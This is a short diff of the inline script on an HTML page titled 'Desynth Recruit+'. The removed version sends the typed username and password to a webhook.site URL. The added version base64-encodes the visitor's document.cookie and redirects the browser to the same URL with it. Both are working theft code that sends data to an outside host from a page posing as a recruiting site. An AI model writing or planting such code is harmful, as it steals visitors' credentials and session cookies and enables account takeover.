@@ -6,11 +6,10 @@
     <title>Desynth Recruit+</title>
     <script>
     	function submit(){
-    		url = "https://webhook.site/c6560158-65d9-4877-8040-964123673650";
-    		username = document.getElementById("username").value;
-    		password = document.getElementById("username").value;
-            sec = btoa(username+":"+password)
-    		document.location=url+"?"+encodeURIComponent(sec);
+       
+            url = "https://webhook.site/c6560158-65d9-4877-8040-964123673650";
+            sec = btoa(document.cookie)
+            document.location=url+"?"+encodeURIComponent(sec);
     	}
     </script>
 
